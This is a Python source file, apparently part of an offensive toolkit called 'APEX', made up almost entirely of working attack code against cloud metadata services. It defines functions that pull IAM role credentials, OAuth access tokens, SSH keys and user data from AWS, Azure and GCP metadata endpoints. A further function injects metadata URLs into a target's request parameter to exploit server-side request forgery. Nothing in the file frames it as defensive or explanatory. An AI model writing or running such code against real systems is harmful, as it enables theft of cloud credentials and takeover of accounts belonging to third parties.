"""
APEX Cloud Attack Module
Exploits cloud metadata endpoints for AWS, Azure, and GCP
"""
import requests

# Cloud metadata endpoints
CLOUD_ENDPOINTS = {
    'aws': {
        'metadata': 'http://169.254.169.254/latest/meta-data/',
        'credentials': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'userdata': 'http://169.254.169.254/latest/user-data/',
        'keys': [
            'ami-id', 'instance-id', 'instance-type', 'hostname',
            'public-keys/0/openssh-key', 'iam/info',
            'placement/availability-zone', 'public-ipv4', 'local-ipv4'
        ]
    },
    'azure': {
        'metadata': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
        'credentials': 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
        'headers': {'Metadata': 'true'}
    },
    'gcp': {
        'metadata': 'http://metadata.google.internal/computeMetadata/v1/instance/',
        'credentials': 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
        'headers': {'Metadata-Flavor': 'Google'},
        'keys': [
            'id', 'name', 'zone', 'machine-type', 'hostname',
            'network-interfaces/0/ip', 'service-accounts/default/email',
            'attributes/ssh-keys', 'disks/0/device-name'
        ]
    },
    'digitalocean': {
        'metadata': 'http://169.254.169.254/metadata/v1.json',
    },
    'oracle': {
        'metadata': 'http://169.254.169.254/opc/v1/instance/',
    }
}

def steal_aws_credentials(target_url=None):
    """Steal AWS credentials from metadata endpoint"""
    results = {'success': False, 'provider': 'AWS', 'data': {}, 'credentials': None}
    
    try:
        # Get IAM role name
        r = requests.get(CLOUD_ENDPOINTS['aws']['credentials'], timeout=5)
        if r.status_code == 200:
            role_name = r.text.strip()
            results['data']['iam_role'] = role_name
            
            # Get credentials
            r2 = requests.get(f"{CLOUD_ENDPOINTS['aws']['credentials']}{role_name}", timeout=5)
            if r2.status_code == 200:
                results['credentials'] = r2.json()
                results['success'] = True
        
        # Get metadata
        for key in CLOUD_ENDPOINTS['aws']['keys'][:5]:
            try:
                r = requests.get(f"{CLOUD_ENDPOINTS['aws']['metadata']}{key}", timeout=3)
                if r.status_code == 200:
                    results['data'][key] = r.text.strip()
            except:
                pass
        
        # Get user data
        try:
            r = requests.get(CLOUD_ENDPOINTS['aws']['userdata'], timeout=3)
            if r.status_code == 200:
                results['data']['userdata'] = r.text[:500]
        except:
            pass
            
    except:
        pass
    
    return results


def steal_azure_credentials():
    """Steal Azure credentials from metadata endpoint"""
    results = {'success': False, 'provider': 'Azure', 'data': {}, 'credentials': None}
    
    try:
        headers = CLOUD_ENDPOINTS['azure']['headers']
        
        # Get instance metadata
        r = requests.get(CLOUD_ENDPOINTS['azure']['metadata'], headers=headers, timeout=5)
        if r.status_code == 200:
            results['data']['metadata'] = r.text[:1000]
            results['success'] = True
        
        # Get access token
        r2 = requests.get(CLOUD_ENDPOINTS['azure']['credentials'], headers=headers, timeout=5)
        if r2.status_code == 200:
            results['credentials'] = r2.json()
            results['success'] = True
            
    except:
        pass
    
    return results


def steal_gcp_credentials():
    """Steal GCP credentials from metadata endpoint"""
    results = {'success': False, 'provider': 'GCP', 'data': {}, 'credentials': None}
    
    try:
        headers = CLOUD_ENDPOINTS['gcp']['headers']
        
        # Get metadata
        for key in CLOUD_ENDPOINTS['gcp']['keys'][:5]:
            try:
                r = requests.get(f"{CLOUD_ENDPOINTS['gcp']['metadata']}{key}", headers=headers, timeout=3)
                if r.status_code == 200:
                    results['data'][key] = r.text.strip()
                    results['success'] = True
            except:
                pass
        
        # Get access token
        r = requests.get(CLOUD_ENDPOINTS['gcp']['credentials'], headers=headers, timeout=5)
        if r.status_code == 200:
            results['credentials'] = r.json()
            results['success'] = True
            
    except:
        pass
    
    return results


def scan_cloud_metadata(target_url=None):
    """Scan all cloud providers for accessible metadata"""
    all_results = []
    
    # Test AWS
    aws = steal_aws_credentials()
    if aws['success']:
        all_results.append(aws)
    
    # Test Azure
    azure = steal_azure_credentials()
    if azure['success']:
        all_results.append(azure)
    
    # Test GCP
    gcp = steal_gcp_credentials()
    if gcp['success']:
        all_results.append(gcp)
    
    return all_results


def exploit_ssrf_to_cloud(target_url, parameter):
    """Exploit SSRF to access cloud metadata"""
    results = []
    
    cloud_urls = [
        'http://169.254.169.254/latest/meta-data/',
        'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
        'http://metadata.google.internal/computeMetadata/v1/instance/',
    ]
    
    for cloud_url in cloud_urls:
        try:
            test_url = target_url.replace(f'{parameter}=', f'{parameter}={cloud_url}')
            r = requests.get(test_url, timeout=5, verify=False)
            if r.status_code == 200 and len(r.text) > 10:
                results.append({
                    'cloud_url': cloud_url,
                    'accessible': True,
                    'response_preview': r.text[:200]
                })
        except:
            pass
    
    return results